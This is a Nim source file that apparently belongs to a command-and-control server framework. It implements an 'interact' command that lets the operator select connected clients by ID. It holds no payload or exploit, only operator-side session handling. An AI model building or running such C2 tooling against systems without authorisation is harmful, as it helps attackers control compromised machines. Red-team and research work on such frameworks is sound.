import ../prelude

proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: Table[string, string], server: C2Server) {.async.} =
  let c2cli = server.cli

  c2cli.handlingClient = @[]
  
  if server.clients.len() < 2:
    c2cli.handlingClient.add server.clients[0]
    c2cli.mode = ClientInteractMode
    return 

  if len(args) < 1:
    errorLog "you must provide a client id to interact with"
    return

  for arg in args:
    let clientId = arg
    var cFound = false
    for client in server.clients:
      if client.id == clientId:
        c2cli.handlingClient.add client
        c2cli.mode = ClientInteractMode
        cFound = true

    if not cFound:
      infoLog "client not found"

let cmd*: Command = Command(
  execProc: execProc,
  name: "interact",
  aliases: @[
    "i"
  ],
  argsLength: 1,
  usage: @[
    "interact [clientID]",
  ],
  description: "Interact with a client",
  category: CCClientInteraction
)